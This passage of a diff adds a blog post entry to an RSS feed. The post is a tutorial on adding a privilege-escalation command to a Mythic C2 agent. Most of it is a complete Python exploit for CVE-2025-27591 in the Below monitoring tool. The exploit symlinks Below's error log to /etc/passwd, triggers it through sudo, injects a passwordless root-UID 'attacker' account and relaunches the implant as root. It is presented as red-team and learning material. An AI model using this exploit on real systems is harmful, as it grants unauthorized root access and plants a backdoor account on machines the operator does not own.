+</span></span><span style="display:flex;"><span>        task_id<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID,
+</span></span><span style="display:flex;"><span>        message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[i] Attempting privilege escalation via Below (CVE-2025-27591)&#34;</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> task
+</span></span></code></pre></div><p>This is called by Mythic before the task gets sent down to the implant. We&rsquo;re doing two things here :</p>
+<ul>
+<li>Setting <code>display_params</code> so the operator sees <code>CVE-2025-27591</code> in the task view instead of an empty string</li>
+<li>Pushing an informational message back to the UI so the operator knows the exploit attempt is underway</li>
+</ul>
+<h4 id="process_response">process_response()</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">process_response</span>(self, task: PTTaskMessageAllData, response: any) <span style="color:#f92672">-&gt;</span> PTTaskProcessResponseMessageResponse:
+</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;output&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#f92672">=</span> PTTaskProcessResponseMessageResponse(TaskID<span style="color:#f92672">=</span>task<span style="color:#f92672">.</span>Task<span style="color:#f92672">.</span>ID, Success<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    resp<span style="color:#f92672">.</span>UserOutput <span style="color:#f92672">=</span> output
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
+</span></span></code></pre></div><p>This is called once the implant sends back a result. We grab the <code>output</code> field from the response, pack it into a <code>PTTaskProcessResponseMessageResponse</code> and hand it back to Mythic which takes care of displaying it in the UI.</p>
+<p>At this point you should be able to see your command in the command selection step of payload creation.</p>
+
+    <img src="/mythic/first_step/command_select.png"  alt="Image showing the command selection utility"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h3 id="command-implementation">Command Implementation</h3>
+<p>Now that the command has been defined, we&rsquo;ll need to implement it, refer to my <a href="https://yassine-elhammoumi.github.io/posts/cve_2025_27591/">Blog post</a> about the CVE for the code, it needs to be tweaked to fit the mythic standard format. The results are as follows :</p>
+<p><em>note: the file(s) need to exist inside <code>AgentName/agent_code</code> directory (you can have a <code>.py2</code> or <code>.py3</code> or <code>.py</code> according to weather it&rsquo;s supported by only python 2, 3 or both)</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(self, task_id):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        B <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/usr/local/bin/below&#34;</span>
+</span></span><span style="display:flex;"><span>        D <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/var/log/below&#34;</span>
+</span></span><span style="display:flex;"><span>        L <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>D<span style="color:#e6db74">}</span><span style="color:#e6db74">/error_root.log&#34;</span>
+</span></span><span style="display:flex;"><span>        P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;attacker::0:0:attacker:/root:/bin/bash</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        output <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>geteuid() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[+] Already root&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Current UID: </span><span style="color:#e6db74">{</span>os<span style="color:#f92672">.</span>geteuid()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- check vuln ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(D):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[-] /var/log/below not found&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (os<span style="color:#f92672">.</span>stat(D)<span style="color:#f92672">.</span>st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0o002</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[-] Directory not writable&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Target vulnerable&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- symlink ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(L):
+</span></span><span style="display:flex;"><span>                    os<span style="color:#f92672">.</span>remove(L)
+</span></span><span style="display:flex;"><span>                os<span style="color:#f92672">.</span>symlink(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, L)
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Symlink placed&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Symlink failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- trigger ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;sudo&#34;</span>, B, <span style="color:#e6db74">&#34;record&#34;</span>], timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">15</span>)
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Trigger executed&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Trigger error (continuing): </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- inject ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> open(L, <span style="color:#e6db74">&#34;a&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                    f<span style="color:#f92672">.</span>write(P)
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] User injected&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[-] Injection failed: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- verify ---</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;attacker:&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>read():
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;[-] Exploit failed (user not present)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Verified attacker user&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># --- spawn ROOT agent ---</span>
+</span></span><span style="display:flex;"><span>            agent_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                subprocess<span style="color:#f92672">.</span>Popen(
+</span></span><span style="display:flex;"><span>                    [
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;su&#34;</span>, <span style="color:#e6db74">&#34;-&#34;</span>, <span style="color:#e6db74">&#34;attacker&#34;</span>,
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nohup python3 </span><span style="color:#e6db74">{</span>agent_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> &gt;/dev/null 2&gt;&amp;1 &amp;&#34;</span>
+</span></span><span style="display:flex;"><span>                    ]
+</span></span><span style="display:flex;"><span>                )
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[+] Root agent launched (background)&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>                output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Failed to launch root agent: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            output<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#34;[*] Wait for new callback in Mythic&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(output)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[FATAL] </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><p>The indent isn&rsquo;t a mistake, make sure to have it indented in such a way because of how the builder functions.</p>
+<p>I won&rsquo;t break down this code, you can read my other post to understand what&rsquo;s happening and why. The main change here is instead of spawning a root shell, we make a new privileged callback.</p>
+
+    <img src="/mythic/first_step/demo.gif"  alt="gif of the pwn command"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>You can customize basically everything, this blog post is only the tip of the iceberg. Make sure to check out the rest of the series to learn about mythic architecture.</p>
+<p>This was very fun.</p>
+]]></content>
+        </item>
         
         <item>
             <title>Getting Started with Mythic C2: Installation, Configuration, and First Callback</title>
